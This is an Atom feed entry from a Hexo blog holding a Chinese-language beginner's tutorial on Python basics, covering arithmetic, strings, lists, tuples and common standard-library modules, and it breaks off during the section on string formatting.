<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Firehacker</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.firehacker.top/"/>
  <updated>2018-10-24T06:51:07.262Z</updated>
  <id>http://www.firehacker.top/</id>
  
  <author>
    <name>Firehacker</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python编程-理论篇</title>
    <link href="http://www.firehacker.top/2018/10/16/Python%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <id>http://www.firehacker.top/2018/10/16/Python编程笔记-基础篇/</id>
    <published>2018-10-16T10:58:08.000Z</published>
    <updated>2018-10-24T06:51:07.262Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文对 <a href="https://www.python.org/" target="_blank" rel="noopener">Python</a> 编程语言的基本用法简要总结，对 Python Web 主流开发框架，网络爬虫，安全运用等学习资源进行梳理，便于查询参阅</p></blockquote><a id="more"></a><hr><h2 id="0x01-基础用法"><a href="#0x01-基础用法" class="headerlink" title="0x01 基础用法"></a>0x01 基础用法</h2><h3 id="1-数和表达式"><a href="#1-数和表达式" class="headerlink" title="1. 数和表达式"></a>1. 数和表达式</h3><p><em>(1) 除法运算的结果为小数，即浮点数（float或floating-point number）</em></p><pre><code>&gt;&gt;&gt; 1/20.5&gt;&gt;&gt; 2/30.6666666666666666&gt;&gt;&gt; 1/11.0</code></pre><p><em>(2) 执行整除运算，可使用双斜杠</em></p><pre><code>&gt;&gt;&gt; 1 // 20&gt;&gt;&gt; 1 // 11&gt;&gt;&gt; 5.0 // 2.12.0</code></pre><p><em>(3) Python 2.x，要对整数执行常规除法运算(取整)，可在程序开头添加如下语句</em></p><pre><code>&gt;&gt;&gt; from __future__ import division</code></pre><p><em>(4) 求余（求模）运算</em></p><pre><code>&gt;&gt;&gt; 10 % 31&gt;&gt;&gt; 10 % -3-2&gt;&gt;&gt; -10 % 32&gt;&gt;&gt; -10 % -3-1</code></pre><p><em>(5) 乘方（求幂）运算符</em></p><pre><code>&gt;&gt;&gt; 2 ** 416&gt;&gt;&gt; (-3) ** 29&gt;&gt;&gt; -3 ** 2-9</code></pre><p><em>乘方运算符的优先级比求负（单目减）高，因此 <code>-3**2</code> 等价于` -(3**2)</em>`</p><p><em>(6) 进制表示</em></p><pre><code>&gt;&gt;&gt; 0xff          十六进制255&gt;&gt;&gt; 0o10          八进制8&gt;&gt;&gt; 0b10000000    二进制128</code></pre><h3 id="2-变量和语句"><a href="#2-变量和语句" class="headerlink" title="2. 变量和语句"></a>2. 变量和语句</h3><p><em>变量是表示（或指向）特定值的名称，名称（ 标识符）只能由字母、数字和下划线（_）构成，且不能以数字打头</em></p><pre><code>&gt;&gt;&gt; x = 3&gt;&gt;&gt; x3&gt;&gt;&gt; x * 515&gt;&gt;&gt; print (x * x)9</code></pre><h3 id="3-获取用户输入"><a href="#3-获取用户输入" class="headerlink" title="3. 获取用户输入"></a>3. 获取用户输入</h3><pre><code>&gt;&gt;&gt; input(&quot;The file is: &quot;)The file is: host&apos;host&apos;&gt;&gt;&gt; x = input(&quot;x: &quot;)x: 12&gt;&gt;&gt; y = input(&quot;y: &quot;)y: 32&gt;&gt;&gt; print(int(x) * int(y))384</code></pre><h3 id="4-函数与模块"><a href="#4-函数与模块" class="headerlink" title="4. 函数与模块"></a>4. 函数与模块</h3><p><em>内置函数：直接调用</em></p><pre><code>&gt;&gt;&gt; 10 + pow(2,3) / 3.0    pow(a,b) 执行幂运算12.666666666666666&gt;&gt;&gt; abs(-10)               abs() 绝对值运算10&gt;&gt;&gt; round(2 / 3)           round 将浮点数圆整为与之最接近的整数1</code></pre><p><em>模块：使用命令import导入，包含众多有用的函数</em></p><pre><code>&gt;&gt;&gt; import math        导入math模块&gt;&gt;&gt;&gt; math.floor(32.9)   floor函数：向下取整32&gt;&gt;&gt; math.floor(-3.2)-4&gt;&gt;&gt; math.ceil(32.9)    ceil函数：向上取整33&gt;&gt;&gt; math.ceil(-3.2)-3&gt;&gt;&gt; import math&gt;&gt;&gt; math.sqrt(3)1.7320508075688772&gt;&gt;&gt; from math import sqrt&gt;&gt;&gt; sqrt(3)1.7320508075688772</code></pre><p><em>使用命令 import 的变种 from module import function ，可在调用函数时不指定模块前缀</em></p><pre><code>&gt;&gt;&gt; import cmath        cmath模块进行复数计算&gt;&gt;&gt; cmath.sqrt(-1)1j&gt;&gt;&gt; (1 + 3j) * (2-4j)(14+2j)</code></pre><h3 id="5-注释"><a href="#5-注释" class="headerlink" title="5. 注释"></a>5. 注释</h3><pre><code>单行注释：以 # 开头# 这是一个注释print(&quot;Hello, World!&quot;) 多行注释：用三个单引号 &apos;&apos;&apos; 或者三个双引号 &quot;&quot;&quot; 将注释括起来</code></pre><h3 id="6-字符串"><a href="#6-字符串" class="headerlink" title="6. 字符串"></a>6. 字符串</h3><p><em>(1) 单引号字符串以及对引号转义</em></p><pre><code>&gt;&gt;&gt; &quot;Hello python&quot;&apos;Hello python&apos;&gt;&gt;&gt; &apos;Hello python&apos;&apos;Hello python&apos;&gt;&gt;&gt; &apos;Let&apos;s go&apos;SyntaxError: invalid syntax&gt;&gt;&gt; &apos;Let\&apos;s go&apos;&quot;Let&apos;s go&quot;</code></pre><p><em>(2) 拼接字符串</em></p><pre><code>&gt;&gt;&gt; &quot;Hello，&quot; + &quot;Python&quot;&apos;Hello，Python&apos;&gt;&gt;&gt; x = &quot;Hello，&quot;&gt;&gt;&gt; y = &quot;Python&quot;&gt;&gt;&gt; x + y&apos;Hello，Python&apos;</code></pre><h3 id="7-print与import"><a href="#7-print与import" class="headerlink" title="7. print与import"></a>7. print与import</h3><p><strong><em>(1) 打印多个函数</em></strong></p><pre><code>&gt;&gt;&gt; print(&apos;Hello&apos;,&apos;python&apos;,&apos;org&apos;)Hello python org&gt;&gt;&gt; print(&apos;Hello&apos;,&apos;python&apos;,&apos;org&apos;,sep=&apos;_&apos;)  #自定义分隔符Hello_python_org&gt;&gt;&gt; print(&apos;hello&apos;,&apos;,&apos;,&apos;python&apos;)hello , python&gt;&gt;&gt; print(&apos;hello&apos;+&apos;,&apos;,&apos;python&apos;) #避免逗号前空格出现hello, python</code></pre><p><strong><em>(2) 导入时重命名</em></strong></p><p><em>在语句末尾添加 as 子句并指定别名</em></p><pre><code>&gt;&gt;&gt; import math as foobar&gt;&gt;&gt; foobar.sqrt(3)1.7320508075688772&gt;&gt;&gt; from math import sqrt as foobar&gt;&gt;&gt; foobar(4)2.0</code></pre><h3 id="8-赋值语句"><a href="#8-赋值语句" class="headerlink" title="8. 赋值语句"></a>8. 赋值语句</h3><p><strong><em>(1) 序列解包</em></strong></p><p><em>序列解包（或可迭代对象解包）：将一个序列（或任何可迭代对象）解包，并将得到的值存储到一系列变量中</em></p><pre><code>&gt;&gt;&gt; values = 1,2,3&gt;&gt;&gt; values(1, 2, 3)&gt;&gt;&gt; x,y,z = values&gt;&gt;&gt; x1&gt;&gt;&gt; a,b,*rest = [1,3,5,7]  #使用星号运算符（ * ）来收集多余的值&gt;&gt;&gt; rest[5, 7]</code></pre><p><strong><em>(2) 链式赋值</em></strong></p><p><em>一种快捷方式，用于将多个变量关联到同一个值</em></p><pre><code>x = y = somefunction()</code></pre><p><strong><em>(3) 增强赋值</em></strong></p><p><em>将右边表达式中的运算符（这里是 + ）移到赋值运算符（ = ）的前面</em></p><pre><code>&gt;&gt;&gt; x = 2&gt;&gt;&gt; x += 1  # x = x+1&gt;&gt;&gt; x3&gt;&gt;&gt; x *= 2  # x = x*2&gt;&gt;&gt; x6</code></pre><h3 id="9-代码缩进"><a href="#9-代码缩进" class="headerlink" title="9. 代码缩进"></a>9. 代码缩进</h3><p><em>代码块是一组语句，可在满足条件时执行（ if 语句），可执行多次（循环），等等；代码块是通过缩进代码（即在前面加空格）来创建的</em></p><p><em>在Python中，使用冒号<code>（ : ）</code>指出接下来是一个代码块，并将该代码块中的每行代码都缩进相同的程度</em></p><h3 id="10-常用标准库"><a href="#10-常用标准库" class="headerlink" title="10. 常用标准库"></a>10. 常用标准库</h3><p><strong><em>(1) 操作系统接口</em></strong></p><p><em>os模块提供了不少与操作系统相关联的函数</em></p><pre><code>&gt;&gt;&gt; import os&gt;&gt;&gt; os.getcwd()   # 返回当前工作目录&apos;C:\\Users\\Python\\Python36-32&apos;&gt;&gt;&gt; os.system(&apos;mkdir test&apos;) # 在当前目录下创建文件夹0&gt;&gt;&gt; os.chdir(&apos;H:\Code\Python&apos;) # 修改当前的工作目录       &gt;&gt;&gt; os.getcwd()           &apos;H:\\Code\\Python&apos;  &gt;&gt;&gt; dir(os)&lt;returns a list of all module functions&gt;&gt;&gt;&gt; help(os)&lt;returns an extensive manual page created from the module&apos;s docstrings&gt;</code></pre><p><strong><em>(2) 文件通配符</em></strong></p><p><em>glob模块提供了一个函数用于从目录通配符搜索中生成文件列表</em></p><pre><code>&gt;&gt;&gt; import glob           &gt;&gt;&gt; glob.glob(&apos;*.py&apos;)       [&apos;class.py&apos;, &apos;except.py&apos;, &apos;for.py&apos;, &apos;if.py&apos;, &apos;ponebook.py&apos;, &apos;while.py&apos;]</code></pre><p><strong><em>(3) sys 模块</em></strong></p><p><em>通用工具脚本经常调用命令行参数；这些命令行参数以链表形式存储于 sys 模块的 argv 变量</em></p><pre><code>&gt;&gt;&gt; import sys&gt;&gt;&gt; print(sys.argv)</code></pre><p><em>错误输出重定向和程序终止：sys 还有 stdin，stdout 和 stderr 属性，即使在 stdout 被重定向时，后者也可以用于显示警告和错误信息</em></p><pre><code>&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.stderr.write(&apos;Warning: log file not found starting a new one\n&apos;)Warning: log file not found starting a new one</code></pre><p><strong><em>(4) 正则匹配</em></strong></p><p><em>re模块为高级字符串处理提供了正则表达式工具</em></p><pre><code>&gt;&gt;&gt; import re&gt;&gt;&gt; re.findall(r&apos;\bf[a-z]*&apos;, &apos;which foot or hand fell fastest&apos;)[&apos;foot&apos;, &apos;fell&apos;, &apos;fastest&apos;]&gt;&gt;&gt; re.sub(r&apos;(\b[a-z]+) \1&apos;, r&apos;\1&apos;, &apos;cat in the the hat&apos;)&apos;cat in the hat&apos;</code></pre><p><strong><em>(5) 数学运算</em></strong></p><p><em>math模块为浮点运算提供了对底层C函数库的访问</em></p><pre><code>&gt;&gt;&gt; import math&gt;&gt;&gt; math.log2(1024)10.0</code></pre><p><em>random提供了生成随机数的工具</em></p><blockquote><blockquote><blockquote><p>import random<br>random.sample(range(1000),8)  # 选定范围内生成指定数目随机数<br>[955, 279, 56, 855, 217, 631, 326, 162]<br>random.random()  # 生成一个浮点类型的随机数<br>0.2882298308566874</p></blockquote></blockquote></blockquote><p><strong><em>(6) 日期时间</em></strong></p><p><em><code>datetime</code>模块为日期和时间处理同时提供了简单和复杂的方法</em></p><pre><code>&gt;&gt;&gt; from datetime import date&gt;&gt;&gt; now = date.today()&gt;&gt;&gt; nowdatetime.date(2018, 10, 21)</code></pre><p><strong><em>(7) 数据压缩</em></strong></p><p><em>以下模块直接支持通用的数据打包和压缩格式：zlib，gzip，bz2，zipfile，以及 tarfile</em></p><pre><code>&gt;&gt;&gt; import zlib&gt;&gt;&gt; s = b&apos;witch which has which witches wrist watch&apos;&gt;&gt;&gt; len(s)41&gt;&gt;&gt; t = zlib.compress(s)&gt;&gt;&gt; len(t)37&gt;&gt;&gt; zlib.decompress(t)b&apos;witch which has which witches wrist watch&apos;&gt;&gt;&gt; zlib.crc32(s)226805979</code></pre><p><em>参考链接：</em></p><ul><li><p><em><a href="http://www.runoob.com/python3/python3-stdlib.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-stdlib.html</a></em></p></li><li><p><em><a href="http://www.runoob.com/python3/python3-os-file-methods.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-os-file-methods.html</a></em></p></li></ul><h3 id="11-文件方法"><a href="#11-文件方法" class="headerlink" title="11. 文件方法"></a>11. 文件方法</h3><p><strong><em>(1) open() 方法</em></strong></p><p><em>open() 方法用于打开一个文件，并返回文件对象，在对文件进行处理过程都需要使用到这个函数，如果该文件无法被打开，会抛出 OSError</em></p><pre><code>open(file, mode=&apos;r&apos;, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None)</code></pre><p><em>参数说明</em></p><pre><code>file: 必需，文件路径（相对或者绝对路径）mode: 可选，文件打开模式buffering: 设置缓冲encoding: 一般使用utf8errors: 报错级别newline: 区分换行符closefd: 传入的file参数类型</code></pre><p><em>参考链接：<a href="http://www.runoob.com/python3/python3-file-methods.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-file-methods.html</a></em></p><hr><h2 id="0x02-列表和元组"><a href="#0x02-列表和元组" class="headerlink" title="0x02 列表和元组"></a>0x02 列表和元组</h2><h3 id="1-序列概述"><a href="#1-序列概述" class="headerlink" title="1. 序列概述"></a>1. 序列概述</h3><p><em>Python内置了多种序列，列表，元组，字符串；列表是可以修改的，而元组不可以</em></p><p><em>列表适用于需要中途添加元素的情形，而元组适用于出于某种考虑需要禁止修改序列的情形</em></p><p><em>Python支持一种数据结构的基本概念，名为容器（container）；容器基本上就是可包含其他对象的对象。两种主要的容器是序列（如列表和元组）和映射（如字典）。在序列中，每个元素都有编号，而在映射中，每个元素都有名称（也叫键）</em></p><h3 id="2-通用序列操作"><a href="#2-通用序列操作" class="headerlink" title="2. 通用序列操作"></a>2. 通用序列操作</h3><p><strong><em>(1) 索引</em></strong></p><pre><code>&gt;&gt;&gt; greet = &quot;Hello&quot;&gt;&gt;&gt; greet[1]&apos;e&apos;&gt;&gt;&gt; greet[-1]&apos;o&apos;</code></pre><p><em>索引（indexing）：用来获取单个元素，适用于所有序列；当使用负数索引时，Python将从右（即从最后一个元素）开始往左数，因此-1是最后一个元素的位置</em></p><pre><code>&gt;&gt;&gt; &apos;Python&apos;[1]&apos;y&apos;</code></pre><p><em>对于字符串字面量（以及其他的序列字面量），可直接对其执行索引操作，无需先将其赋给变量</em></p><p><strong><em>(2) 切片</em></strong></p><p><em>使用切片（slicing）来访问特定范围内的元素，可使用两个索引，并用冒号分隔</em></p><pre><code>&gt;&gt;&gt; tag = &apos;&lt;a href=&quot;http://www.python.org&quot;&gt;Python web site&lt;/a&gt;&apos;&gt;&gt;&gt; tag[9:30]&apos;http://www.python.org&apos;&gt;&gt;&gt; tag[32:-4]&apos;Python web site&apos;</code></pre><p><em>第一个索引是包含的第一个元素的编号，但第二个索引是切片后余下的第一个元素的编号</em></p><pre><code>&gt;&gt;&gt; number = [1,2,3,4,5,6,7,8,9]&gt;&gt;&gt; number[3:6][4, 5, 6]&gt;&gt;&gt; number[-3:-1][7, 8]&gt;&gt;&gt; number[-3:][7, 8, 9]&gt;&gt;&gt; number[:3][1, 2, 3]&gt;&gt;&gt; number[:][1, 2, 3, 4, 5, 6, 7, 8, 9]</code></pre><p><strong><em>指定步长切片</em></strong></p><pre><code>&gt;&gt;&gt; number[0:9:1][1, 2, 3, 4, 5, 6, 7, 8, 9]&gt;&gt;&gt; number[0:9:2][1, 3, 5, 7, 9]&gt;&gt;&gt; number[0:9:3][1, 4, 7]&gt;&gt;&gt; number[9:0:-3][9, 6, 3]</code></pre><p><em>步长为正数时，它从起点移到终点，而步长为负数时，它从终点移到起点</em></p><p><strong><em>(3) 序列拼接</em></strong></p><pre><code>&gt;&gt;&gt; [1,4,7] + [2,5,8][1, 4, 7, 2, 5, 8]&gt;&gt;&gt; [1,2,3] + &quot;hello&quot;TypeError: can only concatenate list (not &quot;str&quot;) to list</code></pre><p><em>可使用加法运算符来拼接序列，不能拼接不同类型的序列</em></p><p><strong><em>(4) 乘法</em></strong></p><pre><code>&gt;&gt;&gt; &apos;girl&apos; * 5&apos;girlgirlgirlgirlgirl&apos;&gt;&gt;&gt; [5] * 8[5, 5, 5, 5, 5, 5, 5, 5]</code></pre><p><em>将序列与数x相乘时，将重复这个序列x次来创建一个新序列</em></p><p><strong><em>(5) 成员资格</em></strong></p><p><em>要检查特定的值是否包含在序列中，可使用运算符 in，它检查是否满足指定的条件，并返回相应的值：满足时返回 True ，不满足时返回 False</em> </p><pre><code>&gt;&gt;&gt; permissions = &apos;xwr&apos;&gt;&gt;&gt; &apos;x&apos; in permissionsTrue&gt;&gt;&gt; users = [&apos;Alice&apos;,&apos;Tom&apos;,&apos;Frank&apos;]&gt;&gt;&gt; input(&quot;Enter your name:&quot;) in  usersEnter your name:TomTrue</code></pre><p><strong><em>(6) 长度和最值</em></strong></p><p><em>内置函数 len 、 min 和 max 很有用，其中函数 len 返回序列包含的元素个数，而 min 和max 分别返回序列中最小和最大的元素</em></p><pre><code>&gt;&gt; numbers = [121,0x12,336]&gt;&gt;&gt; len(numbers)3&gt;&gt;&gt; max(numbers)336&gt;&gt;&gt; min(numbers)18&gt;&gt;&gt; max(56,0x28)56&gt;&gt;&gt; min(0x12,0b1100)12</code></pre><h3 id="3-列表及用法"><a href="#3-列表及用法" class="headerlink" title="3. 列表及用法"></a>3. 列表及用法</h3><p><em>列表是Python重要的数据结构，将一系列值组合成数据结构并通过编号来访问各个值；列表很有用列表是可变的，即可修改其内容，列表有很多特有的方法</em></p><p><strong><em>(1) 函数 list</em></strong></p><p><em>任何序列均可（不仅仅是字符串）作为 list 的参数，创建列表</em></p><pre><code>&gt;&gt;&gt; list(&quot;Python3.6&quot;)[&apos;P&apos;, &apos;y&apos;, &apos;t&apos;, &apos;h&apos;, &apos;o&apos;, &apos;n&apos;, &apos;3&apos;, &apos;.&apos;, &apos;6&apos;]&gt;&gt;&gt; a = list(&quot;Python&quot;)&gt;&gt;&gt; a[&apos;P&apos;, &apos;y&apos;, &apos;t&apos;, &apos;h&apos;, &apos;o&apos;, &apos;n&apos;]&gt;&gt;&gt; &apos;&apos;.join(a)    将字符列表转换为字符串&apos;Python&apos;</code></pre><p><strong><em>(2) 列表操作</em></strong></p><p><em>可对列表执行所有的标准序列操作，如索引、切片、拼接和相乘，列表也是可以修改的，如：给元素赋值、删除元素、给切片赋值以及使用列表的方法</em></p><p><em>A. 修改列表：给元素赋值</em></p><p><em>使用索引表示法给特定位置的元素赋值，如 x[1] = 2</em></p><pre><code>&gt;&gt;&gt; x = [1,4,7,2,5,8]&gt;&gt;&gt; x[1, 4, 7, 2, 5, 8]&gt;&gt;&gt; x[1] = 9&gt;&gt;&gt; x[1, 9, 7, 2, 5, 8]</code></pre><p><em>B. 删除元素</em></p><p><em>使用 del 语句从列表中删除元素； del 语句还可用于用于字典乃至变量</em></p><pre><code>&gt;&gt;&gt; lessons[&apos;English&apos;, &apos;math&apos;, &apos;Chinese&apos;, &apos;Computer&apos;]&gt;&gt;&gt; del lessons[2:]&gt;&gt;&gt; lessons[&apos;English&apos;, &apos;math&apos;]&gt;&gt;&gt; len(lessons)2</code></pre><p><em>C. 给切片赋值</em></p><pre><code>&gt;&gt;&gt; code = list(&apos;python&apos;)&gt;&gt;&gt; code[&apos;p&apos;, &apos;y&apos;, &apos;t&apos;, &apos;h&apos;, &apos;o&apos;, &apos;n&apos;]&gt;&gt;&gt; code[1:] = list(&apos;erl&apos;)&gt;&gt;&gt; code[&apos;p&apos;, &apos;e&apos;, &apos;r&apos;, &apos;l&apos;]</code></pre><p><em>使用切片赋值还可在不替换原有元素的情况下插入新元素</em></p><pre><code>&gt;&gt;&gt; num = [1,3,5,11]&gt;&gt;&gt; num[3:3] = [7,9]&gt;&gt;&gt; num[1, 3, 5, 7, 9, 11]</code></pre><p><em>空切片替换，进行删除操作</em></p><pre><code>&gt;&gt;&gt; num[1:3] = []&gt;&gt;&gt; num[1, 7, 9, 11]</code></pre><p><strong><em>(3) 列表方法</em></strong></p><p><em>方法是与对象（列表、数、字符串等）联系紧密的函数，调用方法：<code>object.method(arguments)</code></em></p><p><em>A. append：方法 append 用于将一个对象附加到列表末尾</em></p><pre><code>&gt;&gt;&gt; lessons[&apos;English&apos;, &apos;math&apos;]&gt;&gt;&gt; lessons.append(&apos;Chinese&apos;)&gt;&gt;&gt; lessons[&apos;English&apos;, &apos;math&apos;, &apos;Chinese&apos;]</code></pre><p><em>B. clear：方法 clear 就地清空列表内容，类似于切片赋值语句 <code>lst[:] = []</code> </em></p><pre><code>&gt;&gt;&gt; num[1, 7, 9, 11]&gt;&gt;&gt; num.clear()&gt;&gt;&gt; num[]&gt;&gt;&gt; num = [1,7,9,11]&gt;&gt;&gt; num[1, 7, 9, 11]&gt;&gt;&gt; num[:] = []&gt;&gt;&gt; num[]</code></pre><p><em>C. copy：方法 copy 复制列表</em></p><pre><code>常规复制只是将另一个名称关联到列表&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b = a&gt;&gt;&gt; b[2] = 4&gt;&gt;&gt; a[1, 2, 4]要让 a 和 b 指向不同的列表，必须将 b 关联到 a 的副本&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b = a.copy()&gt;&gt;&gt; b[2] = 4&gt;&gt;&gt; a[1, 2, 3]</code></pre><p><em>D. count：方法 count 计算指定的元素在列表中出现了多少次</em></p><pre><code>&gt;&gt;&gt; [&apos;to&apos;, &apos;be&apos;, &apos;or&apos;, &apos;not&apos;, &apos;to&apos;, &apos;be&apos;].count(&apos;to&apos;)2&gt;&gt;&gt; x = [[1, 2], 1, 1, [2, 1, [1, 2]]]&gt;&gt;&gt; x.count(1)2&gt;&gt;&gt; x.count([1, 2])1</code></pre><p><em>E. extend：方法 extend 能同时将多个值附加到列表末尾，可使用一个列表来扩展另一个列表</em></p><pre><code>修改被扩展的序列a&gt;&gt;&gt; a = [1,4,7]&gt;&gt;&gt; b = [2,5,8]&gt;&gt;&gt; a.extend(b)&gt;&gt;&gt; a[1, 4, 7, 2, 5, 8]拼接后序列a未被修改&gt;&gt;&gt; a = [1,4,7]&gt;&gt;&gt; b = [2,5,8]&gt;&gt;&gt; a + b[1, 4, 7, 2, 5, 8]&gt;&gt;&gt; a[1, 4, 7]要获得与 extend 相同的效果，可将列表赋给切片&gt;&gt;&gt; a[len(a):] = b&gt;&gt;&gt; a[1, 4, 7, 2, 5, 8]</code></pre><p><em>F. index：方法 index 在列表中查找指定值第一次出现的索引</em></p><pre><code>&gt;&gt;&gt; x = [&apos;to&apos;,&apos;be&apos;,&apos;or&apos;,&apos;not&apos;,&apos;to&apos;,&apos;be&apos;]&gt;&gt;&gt; x.index(&apos;be&apos;)1&gt;&gt;&gt; x[1]&apos;be&apos;</code></pre><p><em>G. insert：方法 insert 用于将一个对象插入列表</em></p><pre><code>&gt;&gt;&gt; numbers = [1, 2, 3, 5, 6, 7]&gt;&gt;&gt; numbers.insert(3, &apos;four&apos;)&gt;&gt;&gt; numbers[1, 2, 3, &apos;four&apos;, 5, 6, 7]使用切片赋值来获得与 insert 一样的效果&gt;&gt;&gt; numbers = [1, 2, 3, 5, 6, 7]&gt;&gt;&gt; numbers[3:3] = [&apos;four&apos;]&gt;&gt;&gt; numbers[1, 2, 3, &apos;four&apos;, 5, 6, 7]</code></pre><p><em>H. pop：方法 pop 从列表中删除一个元素（末尾为最后一个元素），并返回这一元素</em></p><pre><code>&gt;&gt;&gt; x = [1,2,3]&gt;&gt;&gt; x.pop()3&gt;&gt;&gt; x[1, 2]&gt;&gt;&gt; x.pop(1)2&gt;&gt;&gt; x[1]</code></pre><p><em>pop 是唯一既修改列表又返回一个非 None 值的列表方</em></p><pre><code>&gt;&gt;&gt; x = [1, 2, 3]&gt;&gt;&gt; x.append(x.pop())&gt;&gt;&gt; x[1, 2, 3]</code></pre><p><em>push 和 pop 是两种栈操作（加入和取走）的名称；Python没有提供 push ，但可使用 append 来替代；方法 pop 和 append 的效果相反，因此将刚弹出的值压入（或附加）后，得到的栈将与原来相同</em></p><p><em>I. remove：方法 remove 用于删除第一个为指定值的元素</em></p><pre><code>&gt;&gt;&gt; x = [&apos;to&apos;, &apos;be&apos;, &apos;or&apos;, &apos;not&apos;, &apos;to&apos;, &apos;be&apos;]&gt;&gt;&gt; x.remove(&apos;be&apos;)&gt;&gt;&gt; x[&apos;to&apos;, &apos;or&apos;, &apos;not&apos;, &apos;to&apos;, &apos;be&apos;]</code></pre><p> <em>remove 是就地修改且不返回值的方法之一</em></p><p><em>J. reverse：方法 reverse 按相反的顺序排列列表中的元素</em></p><pre><code>&gt;&gt;&gt; x = list(&quot;strings&quot;)&gt;&gt;&gt; x.reverse()&gt;&gt;&gt; x[&apos;s&apos;, &apos;g&apos;, &apos;n&apos;, &apos;i&apos;, &apos;r&apos;, &apos;t&apos;, &apos;s&apos;]</code></pre><p><em>如果要按相反的顺序迭代序列，可使用函数reversed ；这个函数不返回列表，而是返回一个迭代器</em></p><p><em>K. sort：方法 sort 用于对列表就地排序，意味着对原来的列表进行修改，使其元素按顺序排列</em></p><pre><code>&gt;&gt;&gt; x = [1,5,6,9,8,7]&gt;&gt;&gt; x.sort()&gt;&gt;&gt; x[1, 5, 6, 7, 8, 9]sort 修改 x 且不返回任何值，最终的结果是 x 是经过排序的，而 y 包含 None&gt;&gt;&gt; x = [1，5，6，9，8，7]&gt;&gt;&gt; y = x.sort() # Don&apos;t do this!&gt;&gt;&gt; print(y)None正确的方式之一是先将 y 关联到 x 的副本，再对 y 进行排序&gt;&gt;&gt; x = [1,5,6,9,8,7]&gt;&gt;&gt; x[1, 5, 6, 9, 8, 7]&gt;&gt;&gt; y = x.copy()&gt;&gt;&gt; y[1, 5, 6, 9, 8, 7]&gt;&gt;&gt; y.sort()&gt;&gt;&gt; y[1, 5, 6, 7, 8, 9]为获取排序后的列表的副本，另一种方式是使用函数 sorted&gt;&gt;&gt; x = [1,5,6,9,8,7]&gt;&gt;&gt; x[1, 5, 6, 9, 8, 7]&gt;&gt;&gt; y = sorted(x)&gt;&gt;&gt; x[1, 5, 6, 9, 8, 7]&gt;&gt;&gt; y[1, 5, 6, 7, 8, 9]</code></pre><p><em>L. 高级排序</em></p><p><em>方法 sort 接受两个可选参数： key 和 reverse ；这两个参数通常是按名称指定的，称为关键字参数</em></p><pre><code>根据长度对元素进行排序，可将参数 key 设置为函数 len&gt;&gt;&gt; x = [&apos;cloud&apos;,&apos;chinese&apos;,&apos;cool&apos;,&apos;community&apos;]&gt;&gt;&gt; x.sort(key=len)&gt;&gt;&gt; x[&apos;cool&apos;, &apos;cloud&apos;, &apos;chinese&apos;, &apos;community&apos;]对于另一个关键字参数 reverse ，只需将其指定为一个真值，以指出是否要按相反的顺序对列表进行排序&gt;&gt; x = [1,9,2,6,8,7]&gt;&gt;&gt; x[1, 9, 2, 6, 8, 7]&gt;&gt;&gt; x.sort(reverse=True)&gt;&gt;&gt; x[9, 8, 7, 6, 2, 1]</code></pre><h3 id="4-元组及用法"><a href="#4-元组及用法" class="headerlink" title="4. 元组及用法"></a>4. 元组及用法</h3><p><em>与列表一样，元组也是序列，唯一的差别在于<strong>元组是不能修改</strong>的；元组语法很简单，只要将一些值用逗号分隔，就能自动创建一个元组</em></p><pre><code>&gt;&gt;&gt; &apos;h&apos;,&apos;e&apos;,&apos;l&apos;,&apos;l&apos;,&apos;o&apos;(&apos;h&apos;, &apos;e&apos;, &apos;l&apos;, &apos;l&apos;, &apos;o&apos;)&gt;&gt;&gt; 1,4,7(1, 4, 7)&gt;&gt;&gt; x = (1,4,7)&gt;&gt;&gt; x(1, 4, 7)&gt;&gt;&gt; 56,   表示只包含一个值的元组(56,)&gt;&gt;&gt; 5*(8 + 2)50&gt;&gt;&gt; 5*(8 + 2,)(10, 10, 10, 10, 10)&gt;&gt;&gt; tuple(&apos;hello&apos;)   tuple(seq)将一个序列作为参数，并将其转换为元组(&apos;h&apos;, &apos;e&apos;, &apos;l&apos;, &apos;l&apos;, &apos;o&apos;)&gt;&gt;&gt; tuple([1,4,7])(1, 4, 7)&gt;&gt;&gt; x = 1,2,3&gt;&gt;&gt; x[1:](2, 3)</code></pre><ul><li><p><em>它们用作映射中的键（以及集合的成员），而列表不行</em></p></li><li><p><em>有些内置函数和方法返回元组，，只要不尝试修改元组，与元组“打交道”通常意味着像处理列表一样处理它</em></p></li></ul><hr><h2 id="0x03-字符串"><a href="#0x03-字符串" class="headerlink" title="0x03 字符串"></a>0x03 字符串</h2><h3 id="1-基本操作"><a href="#1-基本操作" class="headerlink" title="1. 基本操作"></a>1. 基本操作</h3><p><em>所有标准序列操作（索引、切片、乘法、成员资格检查、长度、最小值和最大值）都适用于字符串，但字符串是不可变的，因此所有的元素赋值和切片赋值都是非法的</em></p><pre><code>&gt;&gt;&gt; website = &quot;http:.//www.python.org&quot;&gt;&gt;&gt; website&apos;http:.//www.python.org&apos;&gt;&gt;&gt; website[-3:] = &apos;com&apos;Traceback (most recent call last):  File &quot;&lt;pyshell#169&gt;&quot;, line 1, in &lt;module&gt;    website[-3:] = &apos;com&apos;TypeError: &apos;str&apos; object does not support item assignment</code></pre><h3 id="2-格式设置"><a href="#2-格式设置" class="headerlink" title="2. 格式设置"></a>2. 格式设置</h3><p><strong>(1) 精简设置</strong></p><pre><code>格式字符串中的 %s 称为转换说明符，指出了要将值插入什么地方；s意味着将值视为字符串进行格式设置&gt;&gt;&gt; format = &quot;Hello,%s %s the python world&quot;&gt;&gt;&gt; values = (&apos;welcome&apos;,&apos;to&apos;)&gt;&gt;&gt; format % values&apos;Hello,welcome to the python world&apos;另一种解决方案是所谓的模板字符串,类似于UNIX shell的语法&gt;&gt;&gt; from string import Template&gt;&gt;&gt; x = Template(&quot;Hello,$who $what python world!&quot;)&gt;&gt;&gt; x.substitute(who=&apos;welcome&apos;,what=&apos;to&apos;)&apos;Hello,welcome to python world!&apos;选择使用字符串方法 format 